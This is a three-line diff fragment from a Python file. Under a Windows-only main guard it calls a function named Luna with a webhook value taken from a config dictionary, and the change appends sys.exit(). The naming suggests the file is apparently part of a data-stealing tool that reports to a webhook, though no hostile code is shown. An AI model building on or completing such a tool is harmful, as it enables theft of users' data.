@@ -1023,3 +1023,5 @@ class Debug:
 
 if __name__ == '__main__' and os.name == "nt":
     Luna(__CONFIG__["webhook"])
+
+sys.exit()
